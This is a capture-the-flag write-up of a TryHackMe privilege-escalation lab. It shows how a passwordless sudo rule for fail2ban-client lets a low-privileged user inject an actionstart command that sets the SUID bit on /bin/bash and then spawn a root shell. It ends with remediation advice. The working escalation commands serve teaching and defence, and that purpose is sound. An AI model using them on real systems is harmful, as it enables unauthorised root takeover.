Fail2Ban Privilege Escalation Write-Up
ğŸ“‹ Challenge Overview

Field	Details
Platform	TryHackMe
Room	Billing
Difficulty	Medium
Category	Privilege Escalation
Vulnerability	Fail2Ban Misconfiguration
ğŸ” Reconnaissance
After gaining initial access to the target machine, we need to enumerate possible privilege escalation vectors.
Checking sudo permissions
bash
Copy code
sudo -l
Output:
User www-data may run the following commands on target:
    (root) NOPASSWD: /usr/bin/fail2ban-client
This reveals that we can run fail2ban-client as root without a password â€” a critical misconfiguration!

ğŸ¯ Vulnerability Analysis
What is Fail2Ban?
Fail2Ban is an intrusion prevention software that protects servers from brute-force attacks by monitoring log files and banning suspicious IP addresses.
The Security Issue
When a user has sudo access to fail2ban-client, they can:
1. Create custom actions with arbitrary commands
2. These actions execute with root privileges
3. Trigger the actions by restarting a jail

ğŸ’€ Exploitation
Step 1: Create Malicious Action
bash
Copy code
sudo /usr/bin/fail2ban-client set sshd action evil actionstart "chmod u+s /bin/bash"

Breakdown:
* set sshd â€” Target the SSH jail
* action evil â€” Create action named "evil"
* actionstart â€” Command runs when jail starts
* chmod u+s /bin/bash â€” Set SUID bit on bash
Step 2: Trigger the Action
bash
Copy code
sudo /usr/bin/fail2ban-client restart sshd
Restarting the jail executes our actionstart command as root.
Step 3: Verify SUID Bit
bash
Copy code
ls -la /bin/bash
Output:
-rwsr-xr-x 1 root root 1183448 /bin/bash

âœ… The s in -rwsr-xr-x confirms SUID bit is set!
Step 4: Spawn Root Shell
bash
Copy code
bash -p
The -p flag preserves elevated privileges, preventing bash from dropping SUID permissions.
Step 5: Confirm Root Access
bash
Copy code
whoami
Output:
root

ğŸ† Capturing the Flags
User Flag
bash
Copy code
cat /home/user/user.txt
Root Flag
bash
Copy code
cat /root/root.txt

ğŸ“Š Attack Flow Diagram
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     Initial Access (www-data)      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Enumerate: sudo -l               â”‚
â”‚   Found: fail2ban-client NOPASSWD  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Inject malicious actionstart     â”‚
â”‚   Command: chmod u+s /bin/bash     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Restart sshd jail                â”‚
â”‚   â†’ Triggers actionstart as root   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   bash -p â†’ ROOT SHELL             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ğŸ›¡ï¸ Remediation

Recommendation	Description
Restrict sudo access	Never allow unprivileged users to run fail2ban-client as root
Use allowlist	If sudo access is required, limit to specific safe commands
Monitor SUID changes	Implement file integrity monitoring for critical binaries
Apply least privilege	Run Fail2Ban with minimal required permissions
ğŸ“š References
* GTFOBins - Fail2Ban
* Fail2Ban Documentation
* SUID Privilege Escalation

ğŸ Conclusion
This challenge demonstrates the dangers of misconfigured sudo permissions. By allowing unrestricted access to fail2ban-client, an attacker can leverage its action system to execute arbitrary commands as root, leading to complete system compromise.
Key Takeaway: Always follow the principle of least privilege when configuring sudo access!
